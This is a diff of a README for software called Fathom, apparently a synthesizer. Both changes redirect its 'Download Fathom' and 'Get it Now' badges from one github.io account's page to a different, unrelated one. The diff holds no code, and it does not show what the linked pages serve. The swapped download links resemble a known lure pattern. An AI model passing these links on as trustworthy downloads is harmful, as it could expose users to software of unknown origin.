@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://polycia-apps.github.io/.github/fathom">
+  <a href="https://pasito2-pod.github.io/.github/fathom">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Fathom"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The combination of vector synthesis with spectral processing creates a synthesis
 
 <p align="center">
 
-[![Get it Now Fathom](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/fathom)
+[![Get it Now Fathom](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://pasito2-pod.github.io/.github/fathom)
 
 </p>
 
